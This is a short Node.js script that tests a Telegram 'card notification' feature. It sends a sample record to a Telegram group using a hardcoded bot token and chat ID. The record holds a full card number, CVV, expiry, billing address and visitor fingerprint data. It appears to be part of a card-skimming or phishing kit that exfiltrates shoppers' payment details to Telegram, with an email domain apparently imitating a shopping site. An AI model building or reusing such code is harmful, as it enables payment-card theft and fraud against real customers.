const TelegramBot = require('./telegram-bot.js');

const bot = new TelegramBot('7931279431:AAEmt1eZuMT0V3xo_-lsrCRFlnDQB-W9rMo', '-1002738425512');

const testCard = {
  cardNumber: '4532123456789012',
  cardName: 'Debug Test User',
  expMonth: '12',
  expYear: '26',
  cvv: '123',
  email: 'debug@pandabuycn.com',
  phoneNumber: '+1234567890',
  billingAddress: '123 Debug St',
  city: 'Debug City',
  state: 'DB',
  zipCode: '12345',
  country: 'Debug Country',
  serverTimestamp: new Date().toISOString(),
  visitorData: {
    ip: '192.168.1.100',
    browser: { name: 'Chrome', version: '120.0' },
    os: { name: 'Windows 11' },
    device: { type: 'Desktop' },
    screen: { resolution: '1920x1080' },
    locale: { timezone: 'America/New_York' }
  }
};

console.log('🔍 Testing Telegram Card Notification...');

const message = bot.formatCardMessage(testCard);
console.log('📏 Message length:', message.length);
console.log('📝 Message preview:');
console.log(message.substring(0, 200) + '...');
console.log('');

bot.sendCardNotification(testCard).then(() => {
  console.log('✅ Debug test completed - check your Telegram group!');
}).catch(err => {
  console.error('❌ Debug test failed:', err.message);
}); 